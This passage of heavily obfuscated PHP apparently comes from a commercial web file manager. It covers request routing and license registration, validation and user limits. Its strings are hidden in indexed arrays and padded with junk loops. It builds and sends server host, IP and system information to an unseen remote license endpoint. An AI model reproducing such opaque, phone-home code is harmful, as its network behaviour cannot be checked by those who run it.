$ªÇğÅÉ– = strtolower($ĞÍ°…ğŞ[0]); $‡ø¨°Ñ§ = $«ÒÉığ[3]; $ğº– = $ÄšäãØø[658]; if (!$ğº–) { die; } if ($ªÇğÅÉ– == $«ÒÉığ[4]) { $‡ø¨°Ñ§ = $«ÒÉığ[5]; $ĞÍ°…ğŞ[0] = $«ÒÉığ[6]; $ĞÍ°…ğŞ[1] = $ĞÍ°…ğŞ[1] . $«ÒÉığ[7]; $µáÄ’ß¬ = join($«ÒÉığ[0], $ĞÍ°…ğŞ); $µáÄ’ß¬ = trim($µáÄ’ß¬, $«ÒÉığ[0]); } call_user_func(array($«ÒÉığ[8], $«ÒÉığ[9]), $‡ø¨°Ñ§ . $«ÒÉığ[10], $µáÄ’ß¬); ActionCall($µáÄ’ß¬); call_user_func(array($«ÒÉığ[8], $«ÒÉığ[9]), $‡ø¨°Ñ§ . $«ÒÉığ[11], $µáÄ’ß¬); } private function autorun() { $‡Õ…Ï¸¹ =& $_SERVER[¤±ª…ß¤]; global $config; if (count($config[$‡Õ…Ï¸¹[12]]) == 0) { return; } foreach ($config[$‡Õ…Ï¸¹[12]] as $’¶ºë«® => $ŞÌÛçêİ) { $this->appRun($ŞÌÛçêİ); } } private function fdjy19f62f97() { $œŸ½ıê =& $_SERVER[ò«¥Ê‡å]; $ËöªŞ®¥ =& $_SERVER[¤±ª…ß¤]; $¾ú°ü¤Ÿ = $ËöªŞ®¥[4]; $®‰ÂÎğÆ = $œŸ½ıê[659]; if (strlen($®‰ÂÎğÆ) < $œŸ½ıê[653]) { die; } $Â¼…µªá = $GLOBALS[$ËöªŞ®¥[13]][$ËöªŞ®¥[14]][0]; $«Ğı¥ä = $œŸ½ıê[660]; if (!$Â¼…µªá || strlen($Â¼…µªá) <= strlen($¾ú°ü¤Ÿ)) { return; } if (strtolower(substr($Â¼…µªá, -strlen($¾ú°ü¤Ÿ))) != $¾ú°ü¤Ÿ) { return; } $¦ó¼îßú = substr($Â¼…µªá, 0, -strlen($¾ú°ü¤Ÿ)); $¡ºŠ‚ = $œŸ½ıê[661]; if (!$¡ºŠ‚) { die; } $ŠµÊñş = array($ËöªŞ®¥[4], $¦ó¼îßú); $Û‚œñ¾‘ = array_slice($GLOBALS[$ËöªŞ®¥[13]][$ËöªŞ®¥[14]], 1); $GLOBALS[$ËöªŞ®¥[13]][$ËöªŞ®¥[14]] = array_merge($ŠµÊñş, $Û‚œñ¾‘); $GLOBALS[$ËöªŞ®¥[13]][$ËöªŞ®¥[15]] = implode($ËöªŞ®¥[0], $GLOBALS[$ËöªŞ®¥[13]][$ËöªŞ®¥[14]]); $º­×õ€ = $œŸ½ıê[662]; if (!$º­×õ€) { return; } } private function pkhv8178384d() { $¡µ¿üı =& $_SERVER[ò«¥Ê‡å]; $®æÃà ¬ =& $_SERVER[¤±ª…ß¤]; if ($GLOBALS[$®æÃà ¬[13]][$®æÃà ¬[15]] != $®æÃà ¬[6]) { return; } $…‚È‡Š¿ = $_SERVER[$®æÃà ¬[16]]; $êÛ›Œ› = $¡µ¿üı[663]; while ($êÛ›Œ› < $¡µ¿üı[664]) { if ($êÛ›Œ› >= 0) { break; } $êÛ›Œ›++; } $êêˆşØº = $®æÃà ¬[17]; $–ÏÒµµ = $¡µ¿üı[665]; if (!strstr($…‚È‡Š¿, $êêˆşØº)) { return; } $ú´ Ûàö = strrpos($…‚È‡Š¿, $êêˆşØº); $Ãâœâ©± = $¡µ¿üı[666]; while ($Ãâœâ©± < $¡µ¿üı[664]) { if ($Ãâœâ©± >= 0) { break; } $Ãâœâ©±++; } $“™‡äÚ = substr($…‚È‡Š¿, $ú´ Ûàö + strlen($êêˆşØº)); $ˆÎ„İ¸Ø = $¡µ¿üı[667]; preg_match_all($®æÃà ¬[18], $“™‡äÚ, $’ñåÑÜÖ); $“™‡äÚ = trim($’ñåÑÜÖ[0][0], $®æÃà ¬[19]); $»øâÌãÓ = $¡µ¿üı[668]; if (!$»øâÌãÓ) { die; } $GLOBALS[$®æÃà ¬[13]][$®æÃà ¬[14]] = explode($®æÃà ¬[19], $“™‡äÚ); $³ªß¥ûú = $¡µ¿üı[669]; while (strlen($³ªß¥ûú) < $¡µ¿üı[670]) { if (!$³ªß¥ûú) { break; } $³ªß¥ûú++; } $GLOBALS[$®æÃà ¬[13]][$®æÃà ¬[15]] = implode($®æÃà ¬[0], $GLOBALS[$®æÃà ¬[13]][$®æÃà ¬[14]]); $ÇÔª¨ = $¡µ¿üı[671]; if (!$ÇÔª¨) { return; } } public function run() { $Ö¢µ… =& $_SERVER[ò«¥Ê‡å]; $‡±±÷Ş =& $_SERVER[¤±ª…ß¤]; $this->pkhv8178384d(); $this->fdjy19f62f97(); $ö†“¹´ñ = $Ö¢µ…[672]; while ($ö†“¹´ñ < $Ö¢µ…[673]) { if ($ö†“¹´ñ >= 0) { break; } $ö†“¹´ñ++; } $œÂ©é˜® = $GLOBALS[$‡±±÷Ş[13]][$‡±±÷Ş[14]]; $Ü¦¦š†¾ = $Ö¢µ…[674]; while (strlen($Ü¦¦š†¾) < $Ö¢µ…[653]) { if (!$Ü¦¦š†¾) { break; } $Ü¦¦š†¾++; } $ªÍ«’Ø = $GLOBALS[$‡±±÷Ş[13]][$‡±±÷Ş[15]]; $…èÜã¥Ö = $Ö¢µ…[675]; while (strlen($…èÜã¥Ö) < $Ö¢µ…[653]) { if (!$…èÜã¥Ö) { break; } $…èÜã¥Ö++; } define($‡±±÷Ş[20], isset($œÂ©é˜®[0]) && $œÂ©é˜®[0] ? $œÂ©é˜®[0] : $this->defaultModule); $ÃÔ‹£Ìı = $Ö¢µ…[676]; define($‡±±÷Ş[21], isset($œÂ©é˜®[1]) && $œÂ©é˜®[0] ? $œÂ©é˜®[1] : $this->defaultController); define($‡±±÷Ş[22], isset($œÂ©é˜®[2]) && $œÂ©é˜®[0] ? $œÂ©é˜®[2] : $this->defaultAction); $Áµª€Ö¹ = $Ö¢µ…[677]; while (strlen($Áµª€Ö¹) < $Ö¢µ…[653]) { if (!$Áµª€Ö¹) { break; } $Áµª€Ö¹++; } define($‡±±÷Ş[23], MOD . $‡±±÷Ş[0] . ST . $‡±±÷Ş[0] . ACT); $_SERVER[$‡±±÷Ş[24]] = strtolower(ACTION); $Âœ¿¯ = $Ö¢µ…[678]; while (strlen($Âœ¿¯) < $Ö¢µ…[679]) { if (!$Âœ¿¯) { break; } $Âœ¿¯++; } $this->autorun(); $ÇÕ³ƒğì = $Ö¢µ…[680]; while ($ÇÕ³ƒğì < $Ö¢µ…[664]) { if ($ÇÕ³ƒğì >= 0) { break; } $ÇÕ³ƒğì++; } if (count($œÂ©é˜®) >= 3) { $this->appRun($ªÍ«’Ø); } else { $this->appRun(ACTION); } } private $puyoc0817e54 = array(); private $zwpn20209303 = ''; public function uhrn3409299c() { $ïïÔåÍú =& $_SERVER[ò«¥Ê‡å]; $Ò°±Û =& $_SERVER[¤±ª…ß¤]; $this->luik87359d89(); $Üëõ˜Ã  = $ïïÔåÍú[681]; if (strlen($Üëõ˜Ã ) < $ïïÔåÍú[679]) { return; } $this->xglb87a76a50(); $ş±ğì·™ = $ïïÔåÍú[682]; if (strlen($ş±ğì·™) < $ïïÔåÍú[653]) { die; } $this->rwaz4c966346(); $this->axqi1d8b5655(); $this->puokc5ecdfde(); $this->fkvdebf52a06(); $­ñ“¥ß = $ïïÔåÍú[683]; $this->yfnx470d2f0e(); $÷§Òçç = $ïïÔåÍú[684]; if (strlen($÷§Òçç) < $ïïÔåÍú[679]) { die; } $this->jnra7e19ef71($Ò°±Û[25], array($this, $Ò°±Û[26])); $this->jnra7e19ef71($Ò°±Û[27], array($this, $Ò°±Û[28])); $œÓ¥ä£  = $ïïÔåÍú[667]; $this->jnra7e19ef71($Ò°±Û[29], array($this, $Ò°±Û[30])); $Ñ™ÛÇù = $ïïÔåÍú[685]; if (strlen($Ñ™ÛÇù) < $ïïÔåÍú[679]) { die; } $this->jnra7e19ef71($Ò°±Û[31], array($this, $Ò°±Û[32])); $’úñ±„š = $ïïÔåÍú[686]; if (!$’úñ±„š) { return; } } public function niok1611fcd1($ïã××Åª) { $ğó»“ŠË =& $_SERVER[ò«¥Ê‡å]; $™ü¢“’‰ =& $_SERVER[¤±ª…ß¤]; $±†„„ß = Model($™ü¢“’‰[33])->get(); $æ¢ÀæòÍ = $ğó»“ŠË[687]; while (strlen($æ¢ÀæòÍ) < $ğó»“ŠË[670]) { if (!$æ¢ÀæòÍ) { break; } $æ¢ÀæòÍ++; } $óÒŠ¿¿ˆ = array($™ü¢“’‰[34], $™ü¢“’‰[35], $™ü¢“’‰[36], $™ü¢“’‰[37], $™ü¢“’‰[38], $™ü¢“’‰[39], $™ü¢“’‰[40], $™ü¢“’‰[41], $™ü¢“’‰[42], $™ü¢“’‰[43], $™ü¢“’‰[44], $™ü¢“’‰[45], $™ü¢“’‰[46], $™ü¢“’‰[47], $™ü¢“’‰[48], $™ü¢“’‰[49], $™ü¢“’‰[50], $™ü¢“’‰[51], $™ü¢“’‰[52], $™ü¢“’‰[53], $™ü¢“’‰[54], $™ü¢“’‰[55], $™ü¢“’‰[56], $™ü¢“’‰[57], $™ü¢“’‰[58], $™ü¢“’‰[59], $™ü¢“’‰[60], $™ü¢“’‰[61], $™ü¢“’‰[62], $™ü¢“’‰[63], $™ü¢“’‰[64], $™ü¢“’‰[65], $™ü¢“’‰[66], $™ü¢“’‰[67], $™ü¢“’‰[68], $™ü¢“’‰[69], $™ü¢“’‰[70], $™ü¢“’‰[71], $™ü¢“’‰[72], $™ü¢“’‰[73], $™ü¢“’‰[74], $™ü¢“’‰[75], $™ü¢“’‰[76], $™ü¢“’‰[77], $™ü¢“’‰[78], $™ü¢“’‰[79], $™ü¢“’‰[80], $™ü¢“’‰[81], $™ü¢“’‰[82], $™ü¢“’‰[83], $™ü¢“’‰[84]); $¨¨íÆîë = $ğó»“ŠË[688]; foreach ($óÒŠ¿¿ˆ as $®²Ëæ) { $ã‡á’ = $GLOBALS[$™ü¢“’‰[85]][$™ü¢“’‰[86]][$®²Ëæ]; $¥Í…ğ¯™ = $ğó»“ŠË[689]; if (strlen($¥Í…ğ¯™) < $ğó»“ŠË[679]) { die; } if (isset($±†„„ß[$®²Ëæ])) { $ã‡á’ = $±†„„ß[$®²Ëæ]; } $ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$®²Ëæ] = $ã‡á’; } $õü¨À‘ = $ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$™ü¢“’‰[46]]; unset($ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[89]][$™ü¢“’‰[90]]); unset($ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[89]][$™ü¢“’‰[91]]); unset($ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$™ü¢“’‰[46]]); unset($ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$™ü¢“’‰[92]]); $ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$™ü¢“’‰[93]] = array($™ü¢“’‰[94] => (int) $õü¨À‘[$™ü¢“’‰[95]], $™ü¢“’‰[96] => (int) _get($õü¨À‘, $™ü¢“’‰[97], 0)); $“‡‹Û°» = substr(md5($™ü¢“’‰[98] . get_client_ip() . $±†„„ß[$™ü¢“’‰[99]]), 0, 15); $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[101]] = Mcrypt::encode(Session::sign(), $“‡‹Û°», 3600 * 24); $½Â§¼„ª = $ğó»“ŠË[690]; if (strlen($½Â§¼„ª) < $ğó»“ŠË[673]) { die; } $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[102]] = Action($™ü¢“’‰[103])->accessToken(); $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[104]] = md5($_SERVER[$™ü¢“’‰[105]] . $±†„„ß[$™ü¢“’‰[99]]); $Ü‘‘¤˜ = $ğó»“ŠË[691]; if (strlen($Ü‘‘¤˜) < $ğó»“ŠË[664]) { die; } $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[106]] = base64_encode(serverInfo()); $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[107]] = $this->zwpn20209303; $´è—âú’ = $ğó»“ŠË[692]; if (strlen($´è—âú’) < $ğó»“ŠË[653]) { die; } if ($±†„„ß[$™ü¢“’‰[107]] != $™ü¢“’‰[108]) { $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[109]] = $±†„„ß[$™ü¢“’‰[109]]; $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[110]] = $±†„„ß[$™ü¢“’‰[110]]; $öä¸Ûú€ = rand_string(10) . $this->zwpn20209303 . rand_string(5); $ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[111]][$™ü¢“’‰[112]] = $this->pcohfae2f6dc($öä¸Ûú€, $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[104]]); } if ($this->zwpn20209303 == $™ü¢“’‰[108]) { $ïã××Åª[$™ü¢“’‰[87]][$™ü¢“’‰[88]][$™ü¢“’‰[93]][$™ü¢“’‰[97]] = 0; } $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[113]] = _get($this->puyoc0817e54, $™ü¢“’‰[114], $™ü¢“’‰[6]); $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[115]] = _get($this->puyoc0817e54, $™ü¢“’‰[116], $™ü¢“’‰[6]); if (KodUser::isRoot() && $this->config[$™ü¢“’‰[117]]) { $ïã××Åª[$™ü¢“’‰[100]][$™ü¢“’‰[118]] = WEB_ROOT; } return $ïã××Åª; } private function fkvdebf52a06() { $…„ì¿©° =& $_SERVER[ò«¥Ê‡å]; $ñëĞ¢° =& $_SERVER[¤±ª…ß¤]; $İª·…„ï = $_SERVER[$ñëĞ¢°[24]] == $ñëĞ¢°[119]; if ($_SERVER[$ñëĞ¢°[24]] == $ñëĞ¢°[120] && $_GET[$ñëĞ¢°[121]] == $ñëĞ¢°[122]) { $İª·…„ï = !0; } if ($İª·…„ï) { $‘ËÁ‹£½ = array($ñëĞ¢°[107] => $this->zwpn20209303, $ñëĞ¢°[123] => $this->gcdwbbdd77d1(), $ñëĞ¢°[124] => Model($ñëĞ¢°[125])->count()); if ($this->zwpn20209303 != $ñëĞ¢°[108]) { $‡ÄÊ£ÍØ = _get($this->puyoc0817e54, $ñëĞ¢°[126]); if ($‡ÄÊ£ÍØ) { $‘ËÁ‹£½[$ñëĞ¢°[127]] = $‡ÄÊ£ÍØ; $‘ËÁ‹£½[$ñëĞ¢°[128]] = strtotime(_get($this->puyoc0817e54, $ñëĞ¢°[129])); $‘ËÁ‹£½[$ñëĞ¢°[130]] = _get($this->puyoc0817e54, $ñëĞ¢°[116]); } $Ôì‰¶¥Ã = Model($ñëĞ¢°[33])->get($ñëĞ¢°[131], $ñëĞ¢°[6], !0); if (is_string($Ôì‰¶¥Ã) && substr($Ôì‰¶¥Ã, 0, 1) == $ñëĞ¢°[132]) { $Ôì‰¶¥Ã = json_decode_force($Ôì‰¶¥Ã); } if (is_array($Ôì‰¶¥Ã) && $Ôì‰¶¥Ã[$ñëĞ¢°[133]] && strstr($Ôì‰¶¥Ã[$ñëĞ¢°[133]], $ñëĞ¢°[134])) { $ŞÛŞ¦ˆı = explode($ñëĞ¢°[134], $Ôì‰¶¥Ã[$ñëĞ¢°[133]]); $‘ËÁ‹£½[$ñëĞ¢°[135]] = $ŞÛŞ¦ˆı[0]; } } $‘ËÁ‹£½ = $this->zxoa6757912c(json_encode($‘ËÁ‹£½), md5($ñëĞ¢°[136])); $–Öª¤â¤ = array($ñëĞ¢°[137] => $‘ËÁ‹£½); call_user_func(array($ñëĞ¢°[138], $ñëĞ¢°[139]), $–Öª¤â¤); } if ($this->zwpn20209303 == $ñëĞ¢°[108]) { return; } $Ş‡ıì£â = array($ñëĞ¢°[140], $ñëĞ¢°[141], $ñëĞ¢°[142], $ñëĞ¢°[143], $ñëĞ¢°[144], $ñëĞ¢°[145]); $ô…Â»Ä = $…„ì¿©°[693]; $˜½•®îÜ = Model($ñëĞ¢°[33])->get(); $ŸğâŸ§ = $…„ì¿©°[694]; if (strlen($ŸğâŸ§) < $…„ì¿©°[673]) { return; } $–Öª¤â¤ = array($ñëĞ¢°[146] => $˜½•®îÜ[$ñëĞ¢°[34]], $ñëĞ¢°[147] => $˜½•®îÜ[$ñëĞ¢°[35]], $ñëĞ¢°[148] => $ñëĞ¢°[6]); foreach ($Ş‡ıì£â as $™È¼Ôò) { if (!isset($˜½•®îÜ[$™È¼Ôò]) || !$˜½•®îÜ[$™È¼Ôò]) { continue; } $–Öª¤â¤[$™È¼Ôò] = $˜½•®îÜ[$™È¼Ôò]; } call_user_func(array($ñëĞ¢°[138], $ñëĞ¢°[139]), $–Öª¤â¤); } private function axqi1d8b5655() { $ÄŞ¯Î×² =& $_SERVER[ò«¥Ê‡å]; $†Ûè·´š =& $_SERVER[¤±ª…ß¤]; if ($_SERVER[$†Ûè·´š[24]] != $†Ûè·´š[149]) { return; } if (!KodUser::isRoot()) { die; } $„Ëå¸ù‰ = $GLOBALS[$†Ûè·´š[13]]; if (isset($„Ëå¸ù‰[$†Ûè·´š[150]])) { $this->ezwsbed5f24f(); die; } if (isset($„Ëå¸ù‰[$†Ûè·´š[151]]) && isset($„Ëå¸ù‰[$†Ûè·´š[151]]) == $†Ûè·´š[122]) { $„Ëå¸ù‰[$†Ûè·´š[152]] = Model($†Ûè·´š[33])->get($†Ûè·´š[153]); } if (!isset($„Ëå¸ù‰[$†Ûè·´š[152]]) || strlen($„Ëå¸ù‰[$†Ûè·´š[152]]) != 16) { show_json($†Ûè·´š[154] . $„Ëå¸ù‰[$†Ûè·´š[152]], !1); } $É•¡Ì‚ = Model($†Ûè·´š[33])->get($†Ûè·´š[99]); $½êß¢é = md5($_SERVER[$†Ûè·´š[105]] . $É•¡Ì‚); $‚Ÿ¡Èê˜ = $ÄŞ¯Î×²[695]; $ñ¹‚°Ï‘ = array($†Ûè·´š[152] => $„Ëå¸ù‰[$†Ûè·´š[152]], $†Ûè·´š[155] => rand_string(16), $†Ûè·´š[156] => $†Ûè·´š[136], $†Ûè·´š[157] => $†Ûè·´š[158], $†Ûè·´š[159] => $_SERVER[$†Ûè·´š[160]], $†Ûè·´š[161] => $_SERVER[$†Ûè·´š[162]], $†Ûè·´š[163] => $_SERVER[$†Ûè·´š[164]], $†Ûè·´š[104] => $½êß¢é, $†Ûè·´š[165] => Model($†Ûè·´š[33])->get($†Ûè·´š[131])); $¬§èÌê = $ÄŞ¯Î×²[696]; if (strlen($¬§èÌê) < $ÄŞ¯Î×²[670]) { return; } if ($„Ëå¸ù‰[$†Ûè·´š[166]] == $†Ûè·´š[167]) { $¢Ì÷ëÃ = $this->zxoa6757912c($½êß¢é, $†Ûè·´š[168]); $èÇ°©± = $this->pcohfae2f6dc(json_encode($ñ¹‚°Ï‘), $½êß¢é . $†Ûè·´š[169], 3); $èÇ°©± = $èÇ°©± . $†Ûè·´š[170] . $_SERVER[$†Ûè·´š[160]]; $¨ÜÃ¡¯ = $this->bjgdc4475dbb($†Ûè·´š[171] . $¢Ì÷ëÃ . $†Ûè·´š[172] . $èÇ°©±, -1); show_json($¨ÜÃ¡¯, !0); } else { if ($„Ëå¸ù‰[$†Ûè·´š[166]] == $†Ûè·´š[173]) { $ÃÕÇ½¸ = substr(md5($†Ûè·´š[174] . $½êß¢é), 12, 15) . $†Ûè·´š[175]; $èÇ°©± = $this->lqtbb3c7e4f5(trim($„Ëå¸ù‰[$†Ûè·´š[176]]), $ÃÕÇ½¸, 2); $Šı¿˜å± = json_decode($èÇ°©±, !0); if (!is_array($Šı¿˜å±) || !is_array($Šı¿˜å±[$†Ûè·´š[177]]) || $Šı¿˜å±[$†Ûè·´š[152]] != !0) { $ÓáÄ÷ = $†Ûè·´š[178]; $Öº“Ï›¾ = $Šı¿˜å±[$†Ûè·´š[177]] ? $†Ûè·´š[179] . $Šı¿˜å±[$†Ûè·´š[177]] : $ÓáÄ÷; show_json($Öº“Ï›¾, !1); } else { $ñ¹‚°Ï‘[$†Ûè·´š[155]] = $Šı¿˜å±[$†Ûè·´š[177]][$†Ûè·´š[180]]; } } else { $Šı¿˜å± = $this->bjgdc4475dbb($†Ûè·´š[181], $ñ¹‚°Ï‘, 10); } } if (!is_array($Šı¿˜å±) || !is_array($Šı¿˜å±[$†Ûè·´š[177]]) || $Šı¿˜å±[$†Ûè·´š[152]] != !0) { $ÓáÄ÷ = LNG($†Ûè·´š[182]); $Öº“Ï›¾ = $Šı¿˜å±[$†Ûè·´š[177]] ? $†Ûè·´š[179] . $Šı¿˜å±[$†Ûè·´š[177]] : $ÓáÄ÷; show_json($Öº“Ï›¾, !1); } $šñ‚õà = $Šı¿˜å±[$†Ûè·´š[177]]; $©ú–¾˜» = $this->xiqn4f44a202($šñ‚õà[$†Ûè·´š[183]]); if (!$©ú–¾˜» || $©ú–¾˜» != $šñ‚õà[$†Ûè·´š[129]]) { $Ö¼ êÜñ = array($†Ûè·´š[184] => Model($†Ûè·´š[33])->get($†Ûè·´š[99]), $†Ûè·´š[185] => $_SERVER[$†Ûè·´š[105]], $†Ûè·´š[186] => this_url(), $†Ûè·´š[161] => $_SERVER[$†Ûè·´š[162]]); $èÇ°©± = $this->pucn221d4741(json_encode($Ö¼ êÜñ)); $this->bjgdc4475dbb($†Ûè·´š[187] . $èÇ°©±); show_json(LNG($†Ûè·´š[188]), !0); } $ˆˆ‘öüÁ = array($†Ûè·´š[153] => $šñ‚õà[$†Ûè·´š[189]], $†Ûè·´š[190] => $šñ‚õà[$†Ûè·´š[191]], $†Ûè·´š[192] => rand_string(16), $†Ûè·´š[107] => $šñ‚õà[$†Ûè·´š[193]]); if ($ñ¹‚°Ï‘[$†Ûè·´š[155]]) { $ˆˆ‘öüÁ[$†Ûè·´š[192]] = $ñ¹‚°Ï‘[$†Ûè·´š[155]]; } $¥û¯êåÁ = substr(md5($ˆˆ‘öüÁ[$†Ûè·´š[190]]), 10, 10); $†‘¤âĞô = $¥û¯êåÁ . $ˆˆ‘öüÁ[$†Ûè·´š[107]] . $ˆˆ‘öüÁ[$†Ûè·´š[192]]; $ˆˆ‘öüÁ[$†Ûè·´š[109]] = strrev(base64_encode($this->zxoa6757912c($†‘¤âĞô, $†Ûè·´š[194]))); $ùœ¤Ú¡ = rand_string(16); $›¹ûÁ‘™ = $ÄŞ¯Î×²[697]; while ($›¹ûÁ‘™ < $ÄŞ¯Î×²[653]) { if ($›¹ûÁ‘™ >= 0) { break; } $›¹ûÁ‘™++; } $©„‘·ıæ = $ùœ¤Ú¡ . $ˆˆ‘öüÁ[$†Ûè·´š[107]] . $this->zxoa6757912c(md5($ˆˆ‘öüÁ[$†Ûè·´š[153]]), $ùœ¤Ú¡); $ˆˆ‘öüÁ[$†Ûè·´š[110]] = base64_encode(strrev($this->zxoa6757912c($©„‘·ıæ, $†Ûè·´š[195]))); if ($šñ‚õà[$†Ûè·´š[196]] && $šñ‚õà[$†Ûè·´š[196]] >= 1) { Model($†Ûè·´š[33])->setDeep($†Ûè·´š[197], $†Ûè·´š[122]); } Model($†Ûè·´š[33])->set($ˆˆ‘öüÁ); $ªĞºáÛç = md5($_SERVER[$†Ûè·´š[105]] . strrev($É•¡Ì‚) . $ˆˆ‘öüÁ[$†Ûè·´š[190]]); $¤Æ«Ç¡ø = strrev(substr($ªĞºáÛç, 10, 16)); $¯ãÊ°Ì = $ÄŞ¯Î×²[698]; if (!$¯ãÊ°Ì) { die; } $Ö©åµòÌ = $this->pcohfae2f6dc(json_encode($šñ‚õà), $ªĞºáÛç); $¶ÓĞ„Ã = $ÄŞ¯Î×²[699]; $”ÂÎà§Ñ = array_to_keyvalue(Model($†Ûè·´š[7])->listData(), $†Ûè·´š[198]); $’Ê…¨Á¯ = $ÄŞ¯Î×²[700]; if (strlen($’Ê…¨Á¯) < $ÄŞ¯Î×²[679]) { return; } $šû¡ÔÏ‰ = $”ÂÎà§Ñ[$†Ûè·´š[199]]; $šØ´–Øü = $ÄŞ¯Î×²[701]; $ÍÈ†‚¿ = array(); $ÍÈ†‚¿[$¤Æ«Ç¡ø] = $Ö©åµòÌ; Model($†Ûè·´š[7])->update($šû¡ÔÏ‰[$†Ûè·´š[200]], array($†Ûè·´š[201] => $ÍÈ†‚¿)); $óößˆÈ¿ = $ÄŞ¯Î×²[702]; $this->puyoc0817e54 = $šñ‚õà; $this->zwpn20209303 = $ˆˆ‘öüÁ[$†Ûè·´š[107]]; $this->licenseRegistSuccess(); $Û…Ñï³¦ = $ÄŞ¯Î×²[703]; while (strlen($Û…Ñï³¦) < $ÄŞ¯Î×²[664]) { if (!$Û…Ñï³¦) { break; } $Û…Ñï³¦++; } Cache::set($†Ûè·´š[202] . md5($É•¡Ì‚ . $†Ûè·´š[203]), $†Ûè·´š[6]); show_json(LNG($†Ûè·´š[188]), !0); } private function licenseRegistSuccess() { $¹ÃÔÒÚŸ =& $_SERVER[ò«¥Ê‡å]; $Øõß§½ó =& $_SERVER[¤±ª…ß¤]; $şÄñ›«µ = Model($Øõß§½ó[33])->get(); $¿Œá€À× = $¹ÃÔÒÚŸ[704]; if (strlen($¿Œá€À×) < $¹ÃÔÒÚŸ[670]) { return; } if ($şÄñ›«µ[$Øõß§½ó[63]] != $Øõß§½ó[122]) { Model($Øõß§½ó[33])->set($Øõß§½ó[63], $Øõß§½ó[122]); } Action($Øõß§½ó[204])->initStart(!0); } private function ezwsbed5f24f() { $±¨®Äô =& $_SERVER[ò«¥Ê‡å]; $›··»êÕ =& $_SERVER[¤±ª…ß¤]; Model($›··»êÕ[33])->set(array($›··»êÕ[153] => $›··»êÕ[6], $›··»êÕ[190] => $›··»êÕ[6], $›··»êÕ[107] => $›··»êÕ[108], $›··»êÕ[109] => $›··»êÕ[6], $›··»êÕ[110] => $›··»êÕ[6])); $ñÓ´„ïü = $±¨®Äô[705]; Model($›··»êÕ[33])->setDeep($›··»êÕ[197], $›··»êÕ[205]); $É‰±ú˜¯ = $±¨®Äô[706]; $this->puyoc0817e54 = array(); $Ò˜£Üñ¾ = $±¨®Äô[707]; if (strlen($Ò˜£Üñ¾) < $±¨®Äô[664]) { die; } $this->zwpn20209303 = $›··»êÕ[108]; $şúÄ–ò = $±¨®Äô[708]; if (!$şúÄ–ò) { return; } } private function luik87359d89() { $Ş½¤ÆíÕ =& $_SERVER[ò«¥Ê‡å]; $á’ªà‡£ =& $_SERVER[¤±ª…ß¤]; $_SERVER[$á’ªà‡£[162]] = _get($_SERVER, $á’ªà‡£[162], APP_HOST); $this->zwpn20209303 = $á’ªà‡£[108]; $÷±ØªÀ“ = $Ş½¤ÆíÕ[709]; if (strlen($÷±ØªÀ“) < $Ş½¤ÆíÕ[673]) { return; } $ßºïÚ‰å = Model($á’ªà‡£[33])->get(); if ($ßºïÚ‰å[$á’ªà‡£[107]] == $á’ªà‡£[108]) { return; } $†ıØóî = Model($á’ªà‡£[33])->get($á’ªà‡£[99]); $¤”—ãÇ‡ = $á’ªà‡£[202] . md5($†ıØóî . $á’ªà‡£[203]); $™‡Ç²ºá = $Ş½¤ÆíÕ[710]; if (strlen($™‡Ç²ºá) < $Ş½¤ÆíÕ[664]) { die; } $£×“Œ‡ = Cache::get($¤”—ãÇ‡); if (!is_array($£×“Œ‡) || !isset($£×“Œ‡[$á’ªà‡£[206]]) || time() - $£×“Œ‡[$á’ªà‡£[206]] >= 60) { $Œï’µØ = Model($á’ªà‡£[7])->loadList(); $º¬©ç» = $Œï’µØ[$á’ªà‡£[199]]; $ƒ‰ÒÚ¨‡ = md5($_SERVER[$á’ªà‡£[105]] . strrev($†ıØóî) . $ßºïÚ‰å[$á’ªà‡£[190]]); $ï­›íúô = strrev(substr($ƒ‰ÒÚ¨‡, 10, 16)); $£×“Œ‡ = $this->lqtbb3c7e4f5($º¬©ç»[$á’ªà‡£[85]][$ï­›íúô], $ƒ‰ÒÚ¨‡); $£×“Œ‡ = json_decode($£×“Œ‡, !0); } if (!is_array($£×“Œ‡)) { return $this->ezwsbed5f24f(); } $Ï‚ÊÍß = strtotime($£×“Œ‡[$á’ªà‡£[129]]); if (time() >= $Ï‚ÊÍß) { return $this->ezwsbed5f24f(); } if (time() - $£×“Œ‡[$á’ªà‡£[206]] > 20) { $£×“Œ‡[$á’ªà‡£[206]] = time(); Cache::set($¤”—ãÇ‡, $£×“Œ‡); } $this->puyoc0817e54 = $£×“Œ‡; $this->zwpn20209303 = $ßºïÚ‰å[$á’ªà‡£[107]]; } private function xglb87a76a50() { $À‡¢üµù =& $_SERVER[¤±ª…ß¤]; $Á½ÄÀ = $GLOBALS[$À‡¢üµù[13]]; $Áî‚êáŒ = $_SERVER[ò«¥Ê‡å][711]; if (!$Áî‚êáŒ) { die; } $ìÓŠ¨å² = $_SERVER[$À‡¢üµù[24]]; if ($ìÓŠ¨å² == $À‡¢üµù[207] && $this->zwpn20209303 == $À‡¢üµù[108]) { show_json(LNG($À‡¢üµù[208]), !1, $À‡¢üµù[209]); } $îŸ¶ó§ã = array($À‡¢üµù[210], $À‡¢üµù[211]); if (in_array($ìÓŠ¨å², $îŸ¶ó§ã)) { if ($this->zwpn20209303 == $À‡¢üµù[108] && isset($Á½ÄÀ[$À‡¢üµù[212]])) { show_json(LNG($À‡¢üµù[208]), !1, $À‡¢üµù[209]); die; } $Äñîû = $this->gcdwbbdd77d1(); if ($Äñîû != intval($À‡¢üµù[213])) { if ($Äñîû <= Model($À‡¢üµù[125])->count()) { show_json(LNG($À‡¢üµù[214]), !1, $À‡¢üµù[209]); die; } } } } 